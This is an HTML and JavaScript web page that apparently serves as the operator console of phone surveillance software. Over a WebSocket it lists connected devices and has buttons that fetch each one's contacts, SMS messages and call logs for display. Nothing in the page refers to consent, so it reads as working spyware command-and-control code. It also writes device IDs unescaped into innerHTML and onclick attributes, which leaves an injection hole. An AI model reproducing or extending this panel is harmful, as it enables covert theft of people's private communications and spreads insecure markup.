<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Device Control Panel</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f4f4f4;
      padding: 2rem;
    }
    h1 {
      color: #333;
    }
    .device {
      background: white;
      padding: 1rem;
      margin: 0.5rem 0;
      border-radius: 6px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .online { color: green; font-weight: bold; }
    .offline { color: red; font-weight: bold; }
    .btn {
      padding: 0.4rem 0.8rem;
      margin: 0.2rem;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    .data-output {
      margin-top: 0.5rem;
      background: #eee;
      padding: 0.5rem;
      border-radius: 4px;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h1>Connected Devices</h1>
  <div id="deviceList">Loading...</div>

  <script>
    const socket = new WebSocket(`ws://${location.host}`);
    const outputMap = new Map();

    socket.addEventListener('open', () => {
      console.log('Connected to backend');
      socket.send(JSON.stringify({ type: 'panelConnect' }));
    });

    socket.addEventListener('message', (event) => {
      const message = JSON.parse(event.data);

      if (message.type === 'deviceList') {
        const container = document.getElementById('deviceList');
        container.innerHTML = '';

        if (message.data.length === 0) {
          container.innerHTML = '<p>No devices connected</p>';
          return;
        }

        message.data.forEach((device) => {
          const el = document.createElement('div');
          el.className = 'device';
          const outputId = `output-${device.id}`;
          el.innerHTML = `
            <div><strong>ID:</strong> ${device.id}</div>
            <div><strong>Status:</strong> <span class="${device.online ? 'online' : 'offline'}">${device.online ? 'Online' : 'Offline'}</span></div>
            <div><strong>Last Seen:</strong> ${device.lastSeen}</div>
            <button class="btn" onclick="requestData('${device.id}', 'contacts')">Get Contacts</button>
            <button class="btn" onclick="requestData('${device.id}', 'sms')">Get SMS</button>
            <button class="btn" onclick="requestData('${device.id}', 'calls')">Get Call Logs</button>
            <div id="${outputId}" class="data-output"></div>
          `;
          container.appendChild(el);
        });
      }

      if (message.type === 'dataResponse') {
        const { deviceId, dataType, payload } = message;
        const output = document.getElementById(`output-${deviceId}`);
        output.textContent = `${dataType.toUpperCase()}\n` + JSON.stringify(payload, null, 2);
      }
    });

    function requestData(deviceId, dataType) {
      socket.send(JSON.stringify({
        type: 'requestData',
        targetId: deviceId,
        dataType: dataType
      }));
    }
  </script>
</body>
</html>
